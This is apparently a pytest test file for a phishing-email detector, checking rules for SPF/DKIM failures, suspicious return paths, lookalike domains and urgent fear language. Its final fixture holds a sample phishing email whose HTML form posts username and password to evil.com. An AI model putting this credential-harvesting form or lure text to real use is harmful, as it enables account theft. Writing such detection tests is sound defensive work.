from __future__ import annotations

import pytest

from detector import analyze_email
from rules.auth_rules import AuthFailureRule
from rules.content_rules import FearLanguageRule
from rules.domain_rules import DomainRule
from rules.header_rules import SuspiciousHostRule
from whitelist import WhitelistConfig, set_config


@pytest.fixture(autouse=True)
def reset_whitelist() -> None:
    set_config(WhitelistConfig())


def test_auth_failure_rule() -> None:
    rule = AuthFailureRule()
    data = {"headers": "spf=temperror dkim=none dmarc=temperror", "urls": [], "domains": [], "ips": [], "body_text": "", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert triggered is True
    assert score >= 2


def test_suspicious_host_rule() -> None:
    rule = SuspiciousHostRule()
    data = {"headers": "Return-Path: root@ubuntu-s-1vcpu", "urls": [], "domains": [], "ips": [], "body_text": "", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert triggered is True


def test_domain_rule_brand_impersonation() -> None:
    rule = DomainRule(whitelist=WhitelistConfig())
    data = {"headers": "", "urls": ["https://g00gle.com/login"], "domains": ["g00gle.com"], "ips": [], "body_text": "", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert triggered is True
    assert score >= 4


def test_domain_rule_whitelist_skip() -> None:
    rule = DomainRule(whitelist=WhitelistConfig())
    data = {"headers": "", "urls": ["https://google.com/page"], "domains": ["google.com"], "ips": [], "body_text": "", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert not triggered


def test_fear_language_rule() -> None:
    rule = FearLanguageRule()
    data = {"headers": "", "urls": [], "domains": [], "ips": [], "body_text": "URGENT: Your account will be suspended. Verify immediately!", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert triggered is True
    assert score > 0


def test_fear_language_clean() -> None:
    rule = FearLanguageRule()
    data = {"headers": "", "urls": [], "domains": [], "ips": [], "body_text": "Hello, just checking in on the quarterly report.", "body_html": "", "forms": []}
    triggered, score, reason = rule.check(data)
    assert not triggered


def test_analyze_email_phishing() -> None:
    data = {
        "headers": "Received: from ubuntu-s-1vcpu-1gb (137.184.34.4)\r\nFrom: bank@evil.com\r\nReturn-Path: root@ubuntu-s-1vcpu\r\nspf=temperror dkim=none dmarc=temperror",
        "urls": ["https://g00gle.com/login"],
        "domains": ["g00gle.com", "evil.com"],
        "ips": ["137.184.34.4", "8.8.8.8"],
        "body_text": "URGENT: Your account will be suspended. Verify immediately! Action required to prevent unauthorized access.",
        "body_html": '<form action="https://evil.com/phish" method="POST"><input name="user"/><input name="pass"/></form>',
        "forms": [{"action": "https://evil.com/phish", "method": "POST", "inputs": ["user", "pass"]}],
    }
    result = analyze_email(data)
    assert result["verdict"] == "PHISHING"
    assert result["score"] >= 8
